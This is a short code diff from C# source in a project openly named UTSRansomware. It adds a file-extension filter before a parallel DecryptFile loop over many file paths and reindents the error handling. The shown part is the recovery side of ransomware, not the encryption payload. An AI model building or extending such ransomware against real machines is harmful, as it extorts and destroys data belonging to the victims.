@@ -69,19 +69,23 @@ namespace UTSRansomware
             // Don't think this is working properly so will have to fix
             Parallel.ForEach(filePaths, (filePath) =>
             {
-                try
+                string fileExtension = Path.GetExtension(filePath);
+                if (Utils.fileExtensions.Contains(fileExtension))
                 {
-                    DecryptFile(filePath);
-                }
+                    try
+                    {
+                        DecryptFile(filePath);
+                    }
 
-                catch (UnauthorizedAccessException)
-                {
-                Console.WriteLine($"Access denied to: {filePath}. Skipping...");
-                }
+                    catch (UnauthorizedAccessException)
+                    {
+                        Console.WriteLine($"Access denied to: {filePath}. Skipping...");
+                    }
 
-                catch (Exception ex)
-                {
-                Console.WriteLine(ex.ToString());
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.ToString());
+                    }
                 }
         });
         }
